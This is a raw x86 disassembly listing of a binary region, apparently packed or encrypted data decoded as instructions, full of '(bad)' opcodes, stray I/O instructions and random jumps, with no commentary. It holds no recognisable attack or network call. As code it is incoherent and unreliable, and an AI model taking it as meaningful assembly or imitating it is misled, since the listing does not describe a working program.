  422065:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422066:	pop    ss
  422067:	je     0x42206b
  422069:	push   esp
  42206a:	mov    bl,0x6d
  42206c:	sub    BYTE PTR [ecx-0xc5fe73e],al
  422072:	push   esi
  422073:	sub    al,0xab
  422075:	or     ah,BYTE PTR [edx+0x6]
  422078:	cmp    ah,BYTE PTR [esp+edx*1+0x11]
  42207c:	mov    ah,0xc7
  42207e:	xchg   ebx,eax
  42207f:	or     al,0xba
  422081:	rcr    DWORD PTR [esi-0x6ea6f3a8],0xa7
  422088:	rol    edi,1
  42208a:	push   esi
  42208b:	repnz push esi
  42208d:	aas    
  42208e:	mov    dl,0x42
  422090:	daa    
  422091:	cmp    BYTE PTR [ebp+eiz*4-0x5cbd65ac],cl
  422098:	and    al,0x3c
  42209a:	fisub  WORD PTR [ebx-0x565f26c5]
  4220a0:	inc    eax
  4220a1:	xchg   ebx,eax
  4220a2:	push   ebp
  4220a3:	add    BYTE PTR [eax],ah
  4220a5:	scas   al,BYTE PTR es:[edi]
  4220a6:	data16 int 0xa1
  4220a9:	push   eax
  4220aa:	dec    edi
  4220ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4220ac:	add    cl,dl
  4220ae:	dec    esi
  4220af:	stos   BYTE PTR es:[edi],al
  4220b0:	fdivr  st(2),st
  4220b2:	pop    ss
  4220b3:	in     al,0x5b
  4220b5:	pop    edx
  4220b6:	push   cs
  4220b7:	add    BYTE PTR [eax],al
  4220b9:	add    BYTE PTR [eax],al
  4220bb:	add    BYTE PTR [eax],al
  4220bd:	add    BYTE PTR [eax],bh
  4220bf:	push   0xffffff96
  4220c1:	add    edx,esi
  4220c3:	(bad)  
  4220c4:	mov    ebp,0xdb4ef67b
  4220c9:	out    0xd6,eax
  4220cb:	add    eax,0xd8be008a
  4220d0:	add    DWORD PTR [eax],eax
  4220d2:	popa   
  4220d3:	add    BYTE PTR [eax],al
  4220d5:	add    BYTE PTR [edi-0x4693cbab],ah
  4220db:	test   al,0xd8
  4220dd:	aad    0x62
  4220df:	stc    
  4220e0:	loope  0x422104
  4220e2:	repz inc esi
  4220e4:	popa   
  4220e5:	sub    eax,0x99e1871b
  4220ea:	push   ecx
  4220eb:	icebp  
  4220ec:	cs jl  0x422078
  4220ef:	sbb    edx,ecx
  4220f1:	xor    dh,BYTE PTR [edx]
  4220f3:	xor    eax,0x26fae21b
  4220f8:	or     edx,0x1ecfab1a
  4220fe:	fwait
  4220ff:	xlat   BYTE PTR gs:[ebx]
  422101:	stc    
  422102:	retf   0x9c78
  422105:	cdq    
  422106:	(bad)  
  422108:	scas   al,BYTE PTR es:[edi]
  422109:	scas   al,BYTE PTR es:[edi]
  42210a:	scas   al,BYTE PTR es:[edi]
  42210b:	inc    ebp
  42210c:	jp     0x42215a
  42210e:	mov    edi,0x53462356
  422113:	or     eax,0x2eae56cd
  422118:	repz xchg esi,eax
  42211a:	xchg   ebx,eax
  42211b:	xor    ecx,0x27
  42211e:	das    
  42211f:	inc    edi
  422120:	es daa 
  422122:	jg     0x42217b
  422124:	rcr    DWORD PTR [edx-0xc923be3],0x97
  42212b:	data16 jmp 0x422170
  42212e:	push   0x4c
  422130:	daa    
  422131:	pusha  
  422132:	(bad)  
  422133:	and    al,0x73
  422135:	icebp  
  422136:	pop    ebx
  422137:	add    BYTE PTR [eax],al
  422139:	add    BYTE PTR [eax],al
  42213b:	add    BYTE PTR [eax],al
  42213d:	add    cl,ch
  42213f:	mov    ecx,0xf37a307a
  422144:	jmp    0x42213f
  422146:	fimul  DWORD PTR [esp+eax*2+0x6c]
  42214a:	jb     0x4220d5
  42214c:	sbb    ebx,edi
  42214e:	pop    ds
  42214f:	fld    DWORD PTR [ecx]
  422151:	add    BYTE PTR [ecx+0x0],ah
  422154:	add    BYTE PTR [eax],al
  422156:	pusha  
  422157:	sub    al,0x6a
  422159:	jmp    0x4221c3
  42215b:	push   edi
  42215c:	in     al,dx
  42215d:	jnp    0x4220fb
  42215f:	clc    
  422160:	xchg   ebx,eax
  422161:	adc    bh,dh
  422163:	es ds push esi
  422166:	aas    
  422167:	cmc    
  422168:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  422169:	(bad)  
  42216a:	xchg   ebx,eax
  42216b:	sbb    BYTE PTR ds:0xab45c1f6,ch
  422171:	dec    ecx
  422172:	jecxz  0x42219b
  422174:	fdivr  QWORD PTR [ebx+0x4d]
  422177:	test   al,0xa7
  422179:	xchg   edx,eax
  42217a:	les    eax,FWORD PTR [edi]
  42217c:	imul   edx,eax,0x4
  42217f:	dec    ebp
  422180:	dec    eax
  422181:	je     0x422165
  422183:	or     DWORD PTR [esi-0x5cab182a],ebp
  422189:	ret    0xc12a
  42218c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42218d:	xlat   BYTE PTR ds:[ebx]
  42218e:	add    BYTE PTR [esi-0x3220d73],bl
  422194:	or     edi,DWORD PTR [edi+0x1241e954]
  42219a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42219b:	(bad)  
  42219d:	pop    edx
  42219e:	cli    
  42219f:	add    DWORD PTR [esi+0x51743eb0],esp
  4221a5:	mov    ebp,0x7fcd6c0a
  4221aa:	jo     0x422169
  4221ac:	cli    
  4221ad:	and    edx,DWORD PTR [edx+esi*2-0x34]
  4221b1:	repz in al,0x52
  4221b4:	push   eax
  4221b5:	fld    TBYTE PTR [eax+0x0]
  4221bb:	add    BYTE PTR [eax],al
  4221bd:	add    BYTE PTR [ebx+0x41],bl
  4221c0:	pop    ebx
  4221c1:	iret   
  4221c2:	pop    ebx
  4221c3:	(bad)  
  4221c5:	aad    0xf
  4221c7:	ss dec esp
  4221c9:	dec    esi
  4221ca:	xor    DWORD PTR [edx-0x7],edx
  4221cd:	inc    BYTE PTR [eax+0x610001d9]
  4221d3:	add    BYTE PTR [eax],al
  4221d5:	add    bl,ch
  4221d7:	jae    0x4221ae
  4221d9:	push   0x54
  4221db:	mov    edi,0x790916b0
  4221e0:	outs   dx,BYTE PTR ds:[esi]
  4221e1:	sahf   
  4221e2:	dec    eax
  4221e3:	cmp    BYTE PTR [ebx],dh
  4221e5:	jo     0x422192
  4221e7:	gs push eax
  4221e9:	retf   
  4221ea:	push   ss
  4221eb:	cmp    eax,ebp
  4221ed:	sbb    DWORD PTR [edx+0x5f60ca5],eax
  4221f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4221f4:	sbb    al,0xce
  4221f6:	mov    esi,0xf14e2022
  4221fb:	jno    0x4221ea
  4221fd:	inc    DWORD PTR [ebp-0x6e120cb8]
  422203:	and    DWORD PTR [eax+eiz*1+0x14],esp
  422207:	ja     0x4221a9
  422209:	stc    
  42220a:	mov    edi,0x9cb2f3b5
  42220f:	jnp    0x422261
  422211:	les    ebx,FWORD PTR [ecx+0x14]
  422214:	aad    0x9c
  422216:	push   eax
  422217:	mov    ebp,DWORD PTR [ebp+0x3b]
  42221a:	mov    al,0x3b
  42221c:	stc    
  42221d:	jmp    0xad609613
  422222:	jge    0x4221b7
  422224:	(bad)  
  422225:	mov    al,ds:0x5f6046d7
  42222a:	inc    edx
  42222b:	sub    ecx,DWORD PTR [esi-0x35]
  42222e:	aaa    
  42222f:	push   edx
  422230:	xchg   BYTE PTR [eax],ah
  422232:	jae    0x4221f2
  422234:	pushf  
  422235:	or     esi,DWORD PTR [edi+0x0]
  422238:	add    BYTE PTR [eax],al
  42223a:	add    BYTE PTR [eax],al
  42223c:	add    BYTE PTR [eax],al
  42223e:	fwait
  42223f:	test   DWORD PTR [ebp+0x3c],esp
  422242:	jg     0x422240
  422244:	(bad)  [edi-0x65be08a1]
  42224a:	mov    BYTE PTR [edi-0x1e],ah
  42224d:	fs loope 0x422229
  422250:	add    DWORD PTR [eax],eax
  422252:	popa   
  422253:	add    BYTE PTR [eax],al
  422255:	add    BYTE PTR [eax-0x584825c0],bh
  42225b:	add    BYTE PTR [ebx-0x5446fa7a],dh
  422261:	pop    esp
  422262:	in     al,dx
  422263:	xlat   BYTE PTR ds:[ebx]
  422264:	sub    DWORD PTR [edx+esi*8+0x1e],0x93a4a22a
  42226c:	mov    esi,DWORD PTR [edi]
  42226e:	js     0x4222c3
  422270:	xchg   edi,eax
  422271:	jae    0x42228c
  422273:	nop
  422274:	add    al,ch
  422276:	sbb    edx,DWORD PTR [edx+0x80acfc4]
  42227c:	data16 lods al,BYTE PTR ds:[esi]
  42227e:	pop    ebx
  42227f:	arpl   WORD PTR [eax+ecx*8-0x1ae57271],sp
  422286:	int    0xe6
  422288:	ret    
  422289:	add    ebp,DWORD PTR [ebp-0x1cf18084]
  42228f:	add    eax,DWORD PTR [edi-0x10]
  422292:	cmp    DWORD PTR [ebx],ebx
  422294:	jmp    0x42229d
  422296:	stc    
  422297:	cwde   
  422298:	xchg   ecx,eax
  422299:	out    dx,al
  42229a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42229b:	daa    
  42229c:	std    
  42229d:	or     al,0xc2
  42229f:	sbb    eax,DWORD PTR [ecx-0x1be1ad0e]
  4222a5:	sub    DWORD PTR [edx-0xd1ebaf6],esp
  4222ab:	ja     0x4222b1
  4222ad:	cmp    BYTE PTR [edi+0x2a],ah
  4222b0:	cmc    
  4222b1:	or     BYTE PTR ds:0xd550c54a,dh
  4222b7:	add    BYTE PTR [eax],al
  4222b9:	add    BYTE PTR [eax],al
  4222bb:	add    BYTE PTR [eax],al
  4222bd:	add    BYTE PTR [esi+0x73],ch
  4222c0:	lock retf 0xcbfd
  4222c4:	jle    0x4222bd
  4222c6:	repz xor eax,0x16c38ce9
  4222cc:	outs   dx,BYTE PTR ds:[esi]
  4222cd:	jae    0x422311
  4222cf:	fiadd  DWORD PTR [ecx]
  4222d1:	add    BYTE PTR [ecx+0x0],ah
  4222d4:	add    BYTE PTR [eax],al
  4222d6:	bound  esp,QWORD PTR [edx+ebp*1]
  4222d9:	and    eax,0x8b05a058
  4222de:	mov    edi,DWORD PTR [ebx+eax*8+0x429708b5]
  4222e5:	cli    
  4222e6:	(bad)  
  4222e7:	rcl    DWORD PTR [ecx-0x26],0xa8
  4222eb:	and    BYTE PTR [edx+0x674ea6a9],bh
  4222f1:	pop    esp
  4222f2:	xchg   ebx,eax
  4222f3:	scas   al,BYTE PTR es:[edi]
  4222f4:	rcl    dh,cl
  4222f6:	retf   0xead3
  4222f9:	add    BYTE PTR [edx],bh
  4222fb:	jp     0x422326
  4222fd:	ins    DWORD PTR es:[edi],dx
  4222fe:	xor    dl,BYTE PTR [ecx]
  422300:	push   es
  422301:	inc    esi
  422302:	pusha  
  422303:	jne    0x422288
  422305:	lds    ebx,FWORD PTR [ebx-0x72]
  422308:	push   es
  422309:	out    0x9b,eax
  42230b:	pop    esp
  42230c:	mov    edi,0x1c563609
  422311:	mov    edi,0xfb0366f5
  422316:	push   ebx
  422317:	push   ebx
  422318:	data16 and BYTE PTR [edx],ah
  42231b:	sub    ecx,DWORD PTR [eax+0x71]
  42231e:	inc    esp
  42231f:	arpl   WORD PTR [ebx+ebp*2-0x2fcac851],dx
  422326:	or     eax,0xbf9a4a29
  42232b:	aam    0x19
  42232d:	sahf   
  42232e:	rcr    DWORD PTR [ebx-0x68],0xb
  422332:	xor    edi,esi
  422334:	mov    BYTE PTR [edx+0x44],ch
  42233a:	add    BYTE PTR [eax],al
  42233c:	add    BYTE PTR [eax],al
  42233e:	cmc    
  42233f:	adc    al,0xae
  422341:	adc    ebp,edi
  422343:	mov    ebx,0x84e6f6fd
  422348:	lds    ebp,FWORD PTR [edx-0x64b357c]
  42234e:	mov    ds:0x610001da,eax
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [ecx-0x2f],ch
  422358:	gs hlt 
  42235a:	xchg   esi,eax
  42235b:	aam    0xb8
  42235d:	aam    0x7e
  42235f:	loop   0x422331
  422361:	sub    al,al
  422363:	int3   
  422364:	mov    ds:0x554dbb0e,eax
  422369:	mov    cl,0x59
  42236b:	rcr    al,0x69
  42236e:	fist   WORD PTR [edx+eiz*2+0x7f]
  422372:	cmp    al,0x42
  422374:	mov    edx,0xc8d9d42e
  422379:	in     eax,dx
  42237a:	xchg   esi,eax
  42237b:	mov    eax,ds:0x471e369d
  422380:	popf   
  422381:	int    0x2b
  422383:	pop    esp
  422384:	test   DWORD PTR [esi-0x33],0x7cacadbb
  42238b:	xchg   esi,eax
  42238c:	retf   
  42238d:	and    DWORD PTR ds:0x8442b433,ebp
  422393:	test   al,0xa
  422395:	mov    gs,WORD PTR [esi+0x22]
  422398:	xor    eax,DWORD PTR [esi]
  42239a:	aas    
  42239b:	clc    
  42239c:	imul   edi,DWORD PTR [eax+0xabf888c],0x5e
  4223a3:	in     al,0x2c
  4223a5:	xchg   ebp,eax
  4223a7:	inc    esi
  4223a8:	loop   0x4223a5
  4223aa:	sub    BYTE PTR ds:0x4ce8830,dh
  4223b0:	icebp  
  4223b1:	mov    ebx,0xa066173
  4223b6:	adc    eax,DWORD PTR [eax]
  4223b8:	add    BYTE PTR [eax],al
  4223ba:	add    BYTE PTR [eax],al
  4223bc:	add    BYTE PTR [eax],al
  4223be:	cmp    esi,DWORD PTR [ecx-0x9200fa9]
  4223c4:	mov    edi,0xbb1c16fb
  4223c9:	rcl    BYTE PTR [eax-0x76],0x28
  4223cd:	xor    al,BYTE PTR [ebx+ebx*8]
  4223d0:	add    DWORD PTR [eax],eax
  4223d2:	popa   
  4223d3:	add    BYTE PTR [eax],al
  4223d5:	add    dh,dh
  4223d7:	jge    0x42244c
  4223d9:	add    eax,0x3480799f
  4223de:	daa    
  4223df:	fidivr DWORD PTR [eax+esi*1]
  4223e2:	adc    edx,edi
  4223e4:	fimul  WORD PTR [ebp-0x22dd0516]
  4223ea:	in     eax,dx
  4223eb:	add    ecx,0xffffffe3
  4223ee:	pop    ebx
  4223ef:	fld    QWORD PTR [ecx-0x37]
  4223f2:	(bad)  
  4223f3:	loope  0x422424
  4223f5:	sub    DWORD PTR [ecx-0x75ebaae4],ebx
  4223fb:	loopne 0x422422
  4223fd:	lods   eax,DWORD PTR ds:[esi]
  4223fe:	retf   
  4223ff:	add    BYTE PTR [ecx+edi*2],0x38
  422403:	push   edx
  422404:	push   ds
  422405:	xchg   esi,eax
  422406:	jle    0x422472
  422408:	inc    esi
  422409:	ds loopne 0x422453
  42240c:	add    DWORD PTR [edi+0x3a05ee9d],edx
  422412:	(bad)  
  422413:	shl    dl,cl
  422415:	(bad)  
  422416:	fstp   TBYTE PTR [esi-0x50e30ca2]
  42241c:	mov    ds:0xee593908,al
  422421:	jmp    0xc44b:0x81e6b5f5
  422428:	dec    esi
  422429:	xor    bh,al
  42242b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42242c:	add    eax,0x821927c8
  422431:	sbb    eax,0x86caf8ce
  422436:	mov    bl,0x0
  422438:	add    BYTE PTR [eax],al
  42243a:	add    BYTE PTR [eax],al
  42243c:	add    BYTE PTR [eax],al
  42243e:	aam    0xf
  422440:	push   ecx
  422441:	lock (bad) 
  422444:	cmc    
  422445:	das    
  422446:	sbb    BYTE PTR [eax],cl
  422448:	xchg   ebx,eax
  422449:	iret   
  42244a:	mov    ebx,DWORD PTR [edx-0x249a2782]
  422450:	add    DWORD PTR [eax],eax
  422452:	popa   
  422453:	add    BYTE PTR [eax],al
  422455:	add    BYTE PTR [edx+0x76],cl
  422458:	xchg   ebx,eax
  422459:	inc    ebp
  42245a:	das    
  42245b:	jle    0x42247f
  42245d:	in     eax,0xa0
  42245f:	fimul  DWORD PTR [eax+0x58e73699]
  422465:	mov    eax,DWORD PTR ds:0x514a711f
  42246b:	test   DWORD PTR [ebx-0x3a24ccf3],edi
  422471:	scas   eax,DWORD PTR es:[edi]
  422472:	add    DWORD PTR [ebx+0x729d12f2],esi
  422478:	cmp    BYTE PTR [esi+0x49886ee0],al
  42247e:	pop    ebx
  42247f:	test   al,0x54
  422481:	dec    DWORD PTR [ebx+ecx*2+0x3f]
  422485:	jb     0x422463
  422487:	icebp  
  422488:	rcl    BYTE PTR [esp+esi*2+0x504ca74c],0xe7
  422490:	cwde   
  422491:	push   0xffffffcd
  422493:	imul   ecx,DWORD PTR [eax+ebx*4-0x1],0x27802ccc
  42249b:	xor    al,BYTE PTR [edi+edi*2]
  42249e:	stos   BYTE PTR es:[edi],al
  42249f:	mov    WORD PTR [ebx+0x75d9b390],ds
  4224a5:	out    0xcb,al
  4224a7:	pop    ebx
  4224a8:	cmp    al,0x59
  4224aa:	dec    edx
  4224ab:	xchg   BYTE PTR [esi-0x29],ch
  4224ae:	idiv   DWORD PTR [ebx]
  4224b0:	jmp    0xeb4e97c0
  4224b5:	fisubr WORD PTR ds:0x0
  4224bb:	add    BYTE PTR [eax],al
  4224bd:	add    ch,cl
  4224bf:	sub    eax,0xfbf54395
  4224c4:	fild   QWORD PTR [edi-0x5bdf5fa9]
  4224ca:	pop    ds
  4224cb:	xor    DWORD PTR [edx-0x3a],ebx
  4224ce:	(bad)  
  4224cf:	fild   DWORD PTR [ecx]
  4224d1:	add    BYTE PTR [ecx+0x0],ah
  4224d4:	add    BYTE PTR [eax],al
  4224d6:	loopne 0x4224c2
  4224d8:	mov    BYTE PTR [ebp-0x45],0xfc
  4224dc:	ins    BYTE PTR es:[edi],dx
  4224dd:	dec    eax
  4224de:	retf   
  4224df:	test   DWORD PTR [eax+0xb],edi
  4224e2:	and    al,bh
  4224e4:	dec    edi
  4224e5:	test   DWORD PTR [esi+0x5c4d7f60],0x510219b4
  4224ef:	sbb    ah,0x93
  4224f2:	inc    ebp
  4224f3:	inc    esp
  4224f4:	loope  0x422570
  4224f6:	sub    eax,0xfa7c2d96
  4224fb:	jmp    0xf21d004c
  422500:	mov    ebx,esi
  422502:	push   0xffffffff
  422504:	mov    ecx,0x2bc2eb33
  422509:	cmp    al,0xdd
  42250b:	sbb    al,ch
  42250d:	xchg   esi,eax
  42250e:	aad    0xca
  422510:	dec    ebx
  422511:	xchg   ecx,eax
  422512:	mov    ah,0xb8
  422514:	push   es
  422515:	sbb    bh,BYTE PTR [ecx+ebx*4+0x5d37f3e4]
  42251c:	add    al,0xe7
  42251e:	xchg   ecx,eax
  42251f:	aaa    
  422520:	mov    al,ds:0x1aac4352
  422525:	pop    ds
  422526:	inc    edi
  422527:	in     al,dx
  422528:	inc    edx
  422529:	push   ebp
  42252a:	mov    eax,ds:0x27107f4f
  42252f:	(bad)  
  422530:	in     eax,0xe2
  422532:	dec    esp
  422533:	cwde   
  422534:	lds    eax,FWORD PTR [bp+di+0x0]
  422538:	add    BYTE PTR [eax],al
  42253a:	add    BYTE PTR [eax],al
  42253c:	add    BYTE PTR [eax],al
  42253e:	adc    esp,DWORD PTR [edi+eiz*8+0xb]
  422542:	test   DWORD PTR [ebx-0xce58301],0x875d4cfc
  42254c:	out    0x2f,al
  42254e:	daa    
  42254f:	fadd   QWORD PTR [ecx]
  422551:	add    BYTE PTR [ecx+0x0],ah
  422554:	add    BYTE PTR [eax],al
  422556:	shr    edx,1
  422558:	push   cs
  422559:	xchg   ebp,eax
  42255a:	xchg   ebp,eax
  42255b:	enter  0x74ce,0x1b
  42255f:	(bad)  
  422560:	fmulp  st(4),st
  422562:	mov    WORD PTR [esi+eiz*2+0x34],?
  422566:	jno    0x4225c2
  422568:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422569:	cli    
  42256a:	inc    esi
  42256b:	jecxz  0x422580
  42256d:	lock sbb DWORD PTR [edi],eax
  422570:	mov    ebp,0xe29d10e8
  422575:	mov    eax,ds:0x193186d6
  42257a:	sbb    DWORD PTR [edi],0x37baf88d
  422580:	and    edi,DWORD PTR [eax]
  422582:	jp     0x4225b2
  422584:	add    DWORD PTR [eax-0x6b15ef28],edx
  42258a:	cmp    dh,BYTE PTR [edi]
  42258c:	loop   0x422609
  42258e:	push   ss
  42258f:	adc    cl,BYTE PTR [edi]
  422591:	inc    ecx
  422592:	pop    esp
  422593:	jl     0x42253f
  422595:	mov    bh,0xf3
  422597:	cwde   
  422598:	enter  0x74c1,0x39
  42259c:	mov    esi,0xe567ee6
  4225a1:	xor    al,BYTE PTR [ecx]
  4225a3:	adc    al,0x76
  4225a5:	lods   eax,DWORD PTR ds:[esi]
  4225a6:	ins    DWORD PTR es:[edi],dx
  4225a7:	push   ds
  4225a8:	push   edx
  4225a9:	sbb    ebp,edi
  4225ab:	cmp    al,0x1d
  4225ad:	enter  0x8bd,0x57
  4225b1:	mov    ecx,0x9e92debc
  4225b6:	or     DWORD PTR [eax],eax
  4225b8:	add    BYTE PTR [eax],al
  4225ba:	add    BYTE PTR [eax],al
  4225bc:	add    BYTE PTR [eax],al
  4225be:	add    dl,BYTE PTR ss:[ebp+0xc]
  4225c2:	jne    0x422623
  4225c4:	jg     0x422600
  4225c6:	clc    
  4225c7:	cs aas 
  4225c9:	push   0xd28b0acc
  4225ce:	in     al,0xce
  4225d0:	add    DWORD PTR [eax],eax
  4225d2:	popa   
  4225d3:	add    BYTE PTR [eax],al
  4225d5:	add    BYTE PTR [edx+0x38ad087e],cl
  4225db:	sub    BYTE PTR [edx-0x5b182e8],cl
  4225e1:	pop    ss
  4225e2:	(bad)  
  4225e3:	shr    BYTE PTR ds:0xcd5c46ea,cl
  4225e9:	out    dx,al
  4225ea:	and    DWORD PTR [edx+0x7],eax
  4225ed:	fisttp WORD PTR [ebp-0x62a031e0]
  4225f3:	sub    eax,DWORD PTR [ebx-0x8f81977]
  4225f9:	aam    0x76
  4225fb:	fmul   DWORD PTR [ebp-0x11888bc8]
  422601:	cmp    ecx,DWORD PTR [edx-0x62]
  422604:	jmp    0xdac2281b
  422609:	adc    esi,DWORD PTR [ebp-0x1c79e52a]
  42260f:	jne    0x42261b
  422611:	jp     0x422651
  422613:	xchg   ebp,eax
  422614:	jo     0x422648
  422616:	push   ds
  422617:	add    DWORD PTR [eax],ecx
  422619:	adc    al,0xe2
  42261b:	idiv   edi
  42261d:	mov    edx,db1
  422620:	mov    dl,0xad
  422622:	add    DWORD PTR [eax-0x75],ebp
  422625:	loope  0x4225bb
  422627:	cmp    eax,0x3a1cedc4
  42262c:	mov    ecx,0x6edcf3cc
  422631:	jp     0x4225d6
  422633:	ret    
  422634:	scas   al,BYTE PTR es:[edi]
  422635:	adc    al,0x0
  422638:	add    BYTE PTR [eax],al
  42263a:	add    BYTE PTR [eax],al
  42263c:	add    BYTE PTR [eax],al
  42263e:	or     BYTE PTR [ecx-0x404c48e],dh
  422644:	dec    ecx
  422645:	mov    bl,0x94
  422647:	je     0x422620
  422649:	call   0xcf45:0xcd1ba8ea
  422650:	add    DWORD PTR [eax],eax
  422652:	popa   
  422653:	add    BYTE PTR [eax],al
  422655:	add    cl,ah
  422657:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  422658:	and    eax,0xa964ed11
  42265d:	mov    edi,ebx
  42265f:	xlat   BYTE PTR ds:[ebx]
  422660:	dec    ebx
  422661:	ret    
  422662:	dec    esp
  422663:	xchg   ecx,eax
  422664:	inc    ecx
  422665:	mov    ah,0xa7
  422667:	ret    
  422668:	push   ss
  422669:	hlt    
  42266a:	mov    al,0xb4
  42266c:	cmp    cl,BYTE PTR [ebx+0x60]
  42266f:	aad    0x52
  422671:	xchg   ebx,eax
  422672:	mov    WORD PTR [eax-0x4dbe5d92],?
  422678:	jbe    0x42264d
  42267a:	sti    
  42267b:	add    al,0xa0
  42267d:	mov    ebx,esp
  42267f:	dec    edi
  422680:	das    
  422681:	dec    BYTE PTR [esp+eiz*8]
  422684:	shl    DWORD PTR ds:0xc8908f2,0xea
  42268b:	sbb    BYTE PTR [ebp+ecx*1+0x27b67a6a],al
  422692:	adc    bh,BYTE PTR [esp+ebp*4+0x3b]
  422696:	scas   eax,DWORD PTR es:[edi]
  422697:	push   ds
  422698:	mov    ebx,0x62a78e7e
  42269d:	mov    ebp,DWORD PTR [ecx-0x34945bab]
  4226a3:	mov    ah,0xdc
  4226a5:	adc    eax,0x4842aa0d
  4226aa:	popa   
  4226ab:	sub    eax,0xef6189bb
  4226b0:	inc    ecx
  4226b1:	sub    eax,0x5c81c43b
  4226b6:	les    eax,FWORD PTR [eax]
  4226b8:	add    BYTE PTR [eax],al
  4226ba:	add    BYTE PTR [eax],al
  4226bc:	add    BYTE PTR [eax],al
  4226be:	fist   WORD PTR [ebx-0x4e]
  4226c1:	dec    edi
  4226c2:	mov    esi,0x67d3ffef
  4226c7:	xchg   ecx,edi
  4226c9:	adc    al,0x15
  4226cb:	mov    bl,0xee
  4226cd:	pop    ebx
  4226ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4226cf:	iret   
  4226d0:	add    DWORD PTR [eax],eax
  4226d2:	popa   
  4226d3:	add    BYTE PTR [eax],al
  4226d5:	add    BYTE PTR [esi+0x7b],dl
  4226d8:	mov    ?,WORD PTR [esp+edi*4+0x50]
  4226dc:	scas   al,BYTE PTR es:[edi]
  4226dd:	je     0x422695
  4226df:	lods   al,BYTE PTR ds:[esi]
  4226e0:	fs shl edx,0x65
  4226e4:	sub    cl,BYTE PTR [ebx+0x76]
  4226e7:	mov    bl,0x1e
  4226e9:	in     eax,dx
  4226ea:	ds das 
  4226ec:	sahf   
  4226ed:	mov    al,ds:0x3bef7757
  4226f2:	sar    dl,cl
  4226f4:	jmp    0x1b7e6047
  4226f9:	cmp    BYTE PTR [edi+0x31151a67],dl
  4226ff:	imul   ebx,DWORD PTR [edi-0x52],0xdeaa8cbb
  422706:	daa    
  422707:	dec    esi
  422708:	das    
  422709:	push   0x7fe0bb2f
  42270e:	mov    dl,0xe8
  422710:	call   0x62c44586
  422715:	xor    al,0xdf
  422717:	sar    BYTE PTR [ebp+ecx*4-0x79],0x19
  42271c:	jp     0x4226bd
  42271e:	sub    eax,0x1f10431f
  422723:	fcomp  QWORD PTR [ecx+0x5e2ec2c5]
  422729:	hlt    
  42272a:	aam    0x77
  42272c:	aam    0x8e
  42272e:	(bad)  
  42272f:	aas    
  422730:	and    BYTE PTR [esi-0x18b96762],bh
  422736:	aaa    
  422737:	add    BYTE PTR [eax],al
  422739:	add    BYTE PTR [eax],al
  42273b:	add    BYTE PTR [eax],al
  42273d:	add    BYTE PTR [edi-0x24252cf4],al
  422743:	fisttp WORD PTR [edi+0x640ccb5d]
  422749:	push   ss
  42274a:	jmp    0x1d0:0x752e382
  422751:	add    BYTE PTR [ecx+0x0],ah
  422754:	add    BYTE PTR [eax],al
  422756:	out    0x6,al
  422758:	and    bl,BYTE PTR [ecx+0x31]
  42275b:	mov    dh,0x61
  42275d:	in     eax,dx
  42275e:	cmp    BYTE PTR [eax+0x471132b1],ch
  422764:	fcomp  QWORD PTR [esi-0x68b38060]
  42276a:	lock rcl BYTE PTR [ebp+0x66],1
  42276e:	jmp    0x4226f5
  422770:	and    BYTE PTR [ecx],al
  422772:	mov    ds:0x9e26edbb,al
  422777:	adc    BYTE PTR [edi+0x5e],al
  42277a:	pop    ds
  42277b:	push   eax
  42277c:	out    0x3d,al
  42277e:	stc    
  42277f:	scas   eax,DWORD PTR es:[edi]
  422780:	push   edi
  422781:	popa   
  422782:	paddd  mm7,QWORD PTR [edx]
  422785:	lds    edx,FWORD PTR [edi+eiz*2+0x71191515]
  42278c:	(bad)
  422790:	fadd   DWORD PTR [ebx+ecx*4-0x1c]
  422794:	xor    bl,BYTE PTR [edi+0x2e]
  422797:	xor    DWORD PTR [esi+0xf1c0f1a],ecx
  42279d:	(bad)  
  42279e:	shr    bl,cl
  4227a0:	cld    
  4227a1:	dec    eax
  4227a2:	pop    eax
  4227a3:	inc    ebx
  4227a4:	mov    ds:0xb71ab2c0,eax
  4227a9:	adc    dh,BYTE PTR [edx-0x65]
  4227ac:	test   DWORD PTR [ecx+0x74b71d8b],0x10f7989d
  4227b6:	and    al,0x0
  4227b8:	add    BYTE PTR [eax],al
  4227ba:	add    BYTE PTR [eax],al
  4227bc:	add    BYTE PTR [eax],al
  4227be:	lahf   
  4227bf:	arpl   WORD PTR [ebp+0x72],cx
  4227c2:	std    
  4227c3:	jle    0x422784
  4227c5:	out    dx,eax
  4227c6:	sbb    edi,esp
  4227c8:	mov    BYTE PTR [edi+esi*1+0x68e2e951],dh
  4227cf:	rol    BYTE PTR [ecx],1
  4227d1:	add    BYTE PTR [ecx+0x0],ah
  4227d4:	add    BYTE PTR [eax],al
  4227d6:	mov    esi,DWORD PTR es:[ebx]
  4227d9:	out    0xac,eax
  4227db:	lock dec esi
  4227dd:	push   esi
  4227de:	aad    0x96
  4227e0:	or     ah,BYTE PTR [ecx+eiz*1]
  4227e3:	sub    BYTE PTR [ebx],cl
  4227e5:	fadd   st,st(1)
  4227e7:	in     al,0xda
  4227e9:	mov    ebx,0xd569c1ea
  4227ee:	addr16 std 
  4227f0:	push   ds
  4227f1:	inc    al
  4227f3:	pop    edx
  4227f4:	mov    ch,0xdf
  4227f6:	idiv   bh
  4227f8:	dec    esi
  4227f9:	outs   dx,BYTE PTR ds:[esi]
  4227fa:	ds cs int 0xc6
  4227fe:	ins    BYTE PTR es:[edi],dx
  4227ff:	sbb    DWORD PTR [ecx+eiz*4-0x80],esi
  422803:	ja     0x422850
  422805:	cli    
  422806:	repz push 0xb4b13a1a
  42280c:	int    0x4b
  42280e:	mov    cl,0xdd
  422810:	ror    DWORD PTR [ecx],0x9e
  422813:	mov    bl,0xbf
  422815:	test   eax,0xbcaf0084
  42281a:	test   al,0x25
  42281c:	or     al,0xf3
  42281e:	push   ebx
  42281f:	lea    ecx,[edx]
  422821:	ret    0xf49a
  422824:	call   0xbac78326
